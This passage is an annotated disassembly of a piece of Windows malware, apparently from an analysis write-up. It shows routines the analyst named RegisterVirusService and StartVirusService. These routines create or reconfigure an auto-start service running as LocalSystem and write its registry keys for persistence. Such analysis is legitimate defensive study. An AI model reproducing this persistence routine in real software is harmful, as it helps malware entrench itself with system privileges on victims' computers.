
```asm
  0040301A             mov     [ebp+hSCObject], eax  
  0040301D             jz      short loc_403088  
  0040301F             push    400h            ; uBytes  
  00403024             push    40h             ; uFlags  
  00403026             call    ds:LocalAlloc  
  0040302C             cmp     eax, edi  
  0040302E             mov     [ebp+var_C], eax  
  00403031             jz      short loc_403088  
  00403033             lea     ecx, [ebp+pcbBytesNeeded]  
  00403036             push    ecx             ; pcbBytesNeeded  
  00403037             push    400h            ; cbBufSize  
  0040303C             push    eax             ; lpServiceConfig  
  0040303D             push    [ebp+hSCObject] ; hService  
  00403040             call    ds:QueryServiceConfigA  
  00403046             test    eax, eax  
  00403048             jz      short loc_403088  
  0040304A             mov     eax, [ebp+var_C]  
  0040304D             cmp     dword ptr [eax+4], 2  
  00403051             jnz     short loc_40305B  
  00403053             mov     eax, [eax+0Ch]  
  00403056             cmp     eax, [ebp+lpBinaryPathName]  
  00403059             jz      short loc_403088  
  0040305B  
  0040305B loc_40305B:  
  0040305B             push    [ebp+lpDisplayName] ; lpDisplayName  
  0040305E             push    edi             ; lpPassword  
  0040305F             push    edi             ; lpServiceStartName  
  00403060             push    edi             ; lpDependencies  
  00403061             push    edi             ; lpdwTagId  
  00403062             push    edi             ; lpLoadOrderGroup  
  00403063             push    [ebp+lpBinaryPathName] ; lpBinaryPathName  
  00403066             push    0FFFFFFFFh      ; dwErrorControl  
  00403068             push    2               ; dwStartType  
  0040306A             push    10h             ; dwServiceType  
  0040306C             push    [ebp+hSCObject] ; hService  
  0040306F             call    ds:ChangeServiceConfigA  
  00403075             push    [ebp+arg_C]  
  00403078             lea     eax, [ebp+var_110]  
  0040307E             push    esi  
  0040307F             push    eax  
  00403080             call    SetVirusServiceKeys  
  00403085             add     esp, 0Ch  
  00403088  
  00403088 loc_403088:  
  00403088             push    edi             ; lpPassword  
  00403089             push    edi             ; lpServiceStartName  
  0040308A             push    edi             ; lpDependencies  
  0040308B             push    edi             ; lpdwTagId  
  0040308C             push    edi             ; lpLoadOrderGroup  
  0040308D             push    [ebp+lpBinaryPathName] ; lpBinaryPathName  
  00403090             push    1               ; dwErrorControl  
  00403092             push    2               ; dwStartType  
  00403094             push    10h             ; dwServiceType  
  00403096             push    ebx             ; dwDesiredAccess  
  00403097             push    [ebp+lpDisplayName] ; lpDisplayName  
  0040309A             push    [ebp+lpServiceName] ; lpServiceName  
  0040309D             push    [ebp+hSCManager] ; hSCManager  
  004030A0             call    ds:CreateServiceA  
  004030A6             push    [ebp+arg_C]  
  004030A9             lea     eax, [ebp+var_110]  
  004030AF             push    esi  
  004030B0             push    eax  
  004030B1             call    SetVirusServiceKeys  
  004030B6             add     esp, 0Ch  
  004030B9  
  004030B9 loc_4030B9:  
  004030B9             push    [ebp+hSCObject] ; hSCObject  
  004030BC             call    ds:CloseServiceHandle  
  004030C2             push    1               ; dwMilliseconds  
  004030C4             call    ds:Sleep  
  004030CA             push    [ebp+lpServiceName]  
  004030CD             lea     eax, [ebp+var_110]  
  004030D3             push    offset aDisplayname ; "DisplayName"  
  004030D8             push    eax  
  004030D9             call    SetVirusServiceKeys  
  004030DE             push    [ebp+arg_C]  
  004030E1             lea     eax, [ebp+var_110]  
  004030E7             push    esi  
  004030E8             push    eax  
  004030E9             call    SetVirusServiceKeys  
  004030EE             push    1  
  004030F0             lea     eax, [ebp+var_110]  
  004030F6             push    offset aErrorcontrol ; "ErrorControl"  
  004030FB             push    eax  
  004030FC             call    sub_402DC6  
  00403101             push    [ebp+lpBinaryPathName]  
  00403104             lea     eax, [ebp+var_110]  
  0040310A             push    offset aImagepath ; "ImagePath"  
  0040310F             push    eax  
  00403110             call    SetVirusServiceKeys  
  00403115             push    offset aLocalsystem ; "LocalSystem"  
  0040311A             lea     eax, [ebp+var_110]  
  00403120             push    offset aObjectname ; "ObjectName"  
  00403125             push    eax  
  00403126             call    SetVirusServiceKeys  
  0040312B             push    2  
  0040312D             lea     eax, [ebp+var_110]  
  00403133             push    offset aStart    ; "Start"  
  00403138             push    eax  
  00403139             call    sub_402DC6  
  0040313E             add     esp, 48h  
  00403141             lea     eax, [ebp+var_110]  
  00403147             push    10h  
  00403149             push    offset aType     ; "Type"  
  0040314E             push    eax  
  0040314F             call    sub_402DC6  
  00403154             add     esp, 0Ch  
  00403157             push    1  
  00403159             pop     eax  
  0040315A             cmp     [ebp+arg_14], eax  
  0040315D             jz      short loc_40316D  
  0040315F             push    [ebp+dwMilliseconds] ; dwMilliseconds  
  00403162             call    ds:Sleep  
  00403168             jmp     loc_402FF5  
  0040316D ; ----------------------------------------------------------------------------  
  0040316D  
  0040316D loc_40316D:  
  0040316D             pop     edi  
  0040316E             pop     esi  
  0040316F             pop     ebx  
  00403170             leave  
  00403171             retn  
  00403171 RegisterVirusService endp  
}  

00402BE6             push    esi  
00402BE7             call    StartVirusService ; 启动病毒服务  

{  
  00402F3C StartVirusService proc near  
  00402F3C  
  00402F3C lpServiceName   = dword ptr  0Ch  
  00402F3C  
  00402F3C             push    esi  
  00402F3D             push    edi  
  00402F3E             push    0F003Fh         ; dwDesiredAccess  
  00402F43             push    0               ; lpDatabaseName  
  00402F45             push    0               ; lpMachineName  
  00402F47             call    ds:OpenSCManagerA ; Establish a connection to the service  
  00402F47                         ; control manager on the specified computer  
  00402F47                         ; and opens the specified database  
  00402F4D             mov     edi, eax  
  00402F4F             test    edi, edi  
  00402F51             jz      short loc_402F80  
  00402F53             push    0F01FFh         ; dwDesiredAccess  
```
